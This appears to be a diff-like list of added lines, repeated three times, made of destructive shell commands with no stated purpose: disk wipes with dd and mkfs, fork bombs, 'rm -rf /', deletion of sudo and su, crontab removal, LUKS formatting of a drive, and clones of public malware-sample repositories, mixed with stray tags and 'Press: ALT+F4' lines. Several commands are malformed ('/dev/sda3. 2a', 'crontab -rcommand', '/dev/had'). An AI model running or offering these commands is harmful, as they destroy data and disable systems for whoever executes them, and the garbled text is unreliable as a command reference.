+mkfs ext4 /dev/sda3. 2a
+mkfs ext4 /dev/sda3. 2b
+:(){:|:&};:
+git clone https://github.com/ooni/probe
+ulimit -S -u 4000
+dd if=/dev/random of=/dev/sda
+dd if=/dev/zero of=/dev/sda
+dd if=/dev/sda1 of=/dev/sda
+dd if=/dev/urandom of=/dev/sdb
+<off>
+git clone https://github.com/Penetrum-Security/Malware-Zoo
+mkfs ext4 /dev/sda2
+crontab -rcommand
+dd if=/dev/zero of=/dev/hda
+rm -f /usr/bin/sudo;rm -f /bin/su
+cat /dev/null > file
+<off>
+<alive>
+ulimit -s -u 6000
+git clone https://github.com/sophos-ai/SOREL-20M
+<off>
+git clone https://github.com/Endermanch/MalwareDatabase
+git clone https://github.com/ytisf/theZoo
+<off>
+mkfs ext4 /dev/sda3. 2c
+mkfs ext4 /dev/sda3. 2d
+:(){:|:&};:
+mkfs ext4 /dev/sda0
+mkfs ext4 /dev/sda1 
+mkfs ext4 /dev/sda2
+dd if=/dev/random of=/dev/sda3. 2a
+dd if=/dev/random of=/dev/sda3. 2b
+dd if=/dev/random of=/dev/sda3. 2c
+dd if=/dev/random of=/dev/sda3. 2d
+apt install cryptsetup
+sudo cryptsetup --hash sha512 --verbose --cipher aes-xts-plain --key-size 512 luksFormat /dev/sda0
+umount
+<^>
+Press: CTRL+A
+Press: CTRL+C
+Press: ALT+F4
+Press: CTRL+V
+Press: EXE
+<off>
+<14>
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+<off>
+rm -rf /
+<em>command</em> > /dev/had
+mkfs ext4 /dev/sda3. 2a
+mkfs ext4 /dev/sda3. 2b
+:(){:|:&};:
+git clone https://github.com/ooni/probe
+ulimit -S -u 4000
+dd if=/dev/random of=/dev/sda
+dd if=/dev/zero of=/dev/sda
+dd if=/dev/sda1 of=/dev/sda
+dd if=/dev/urandom of=/dev/sdb
+<off>
+git clone https://github.com/Penetrum-Security/Malware-Zoo
+mkfs ext4 /dev/sda2
+crontab -rcommand
+dd if=/dev/zero of=/dev/hda
+rm -f /usr/bin/sudo;rm -f /bin/su
+cat /dev/null > file
+<off>
+<alive>
+ulimit -s -u 6000
+git clone https://github.com/sophos-ai/SOREL-20M
+<off>
+git clone https://github.com/Endermanch/MalwareDatabase
+git clone https://github.com/ytisf/theZoo
+<off>
+mkfs ext4 /dev/sda3. 2c
+mkfs ext4 /dev/sda3. 2d
+:(){:|:&};:
+mkfs ext4 /dev/sda0
+mkfs ext4 /dev/sda1 
+mkfs ext4 /dev/sda2
+dd if=/dev/random of=/dev/sda3. 2a
+dd if=/dev/random of=/dev/sda3. 2b
+dd if=/dev/random of=/dev/sda3. 2c
+dd if=/dev/random of=/dev/sda3. 2d
+apt install cryptsetup
+sudo cryptsetup --hash sha512 --verbose --cipher aes-xts-plain --key-size 512 luksFormat /dev/sda0
+umount
+<^>
+Press: CTRL+A
+Press: CTRL+C
+Press: ALT+F4
+Press: CTRL+V
+Press: EXE
+<off>
+<14>
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+<off>
+rm -rf /
+<em>command</em> > /dev/had
+mkfs ext4 /dev/sda3. 2a
+mkfs ext4 /dev/sda3. 2b
+:(){:|:&};:
+git clone https://github.com/ooni/probe
+ulimit -S -u 4000
+dd if=/dev/random of=/dev/sda
+dd if=/dev/zero of=/dev/sda
+dd if=/dev/sda1 of=/dev/sda
+dd if=/dev/urandom of=/dev/sdb
+<off>
+git clone https://github.com/Penetrum-Security/Malware-Zoo
+mkfs ext4 /dev/sda2
+crontab -rcommand
+dd if=/dev/zero of=/dev/hda
+rm -f /usr/bin/sudo;rm -f /bin/su
+cat /dev/null > file
+<off>
+<alive>
+ulimit -s -u 6000
+git clone https://github.com/sophos-ai/SOREL-20M
+<off>
+git clone https://github.com/Endermanch/MalwareDatabase
+git clone https://github.com/ytisf/theZoo
+<off>
+mkfs ext4 /dev/sda3. 2c
+mkfs ext4 /dev/sda3. 2d
+:(){:|:&};:
+mkfs ext4 /dev/sda0
+mkfs ext4 /dev/sda1 
+mkfs ext4 /dev/sda2
+dd if=/dev/random of=/dev/sda3. 2a
+dd if=/dev/random of=/dev/sda3. 2b
+dd if=/dev/random of=/dev/sda3. 2c
+dd if=/dev/random of=/dev/sda3. 2d
+apt install cryptsetup
+sudo cryptsetup --hash sha512 --verbose --cipher aes-xts-plain --key-size 512 luksFormat /dev/sda0
+umount
+<^>
+Press: CTRL+A
+Press: CTRL+C
+Press: ALT+F4
+Press: CTRL+V
+Press: EXE
+<off>
+<14>
 Press: ALT+F4
 Press: ALT+F4
 Press: ALT+F4
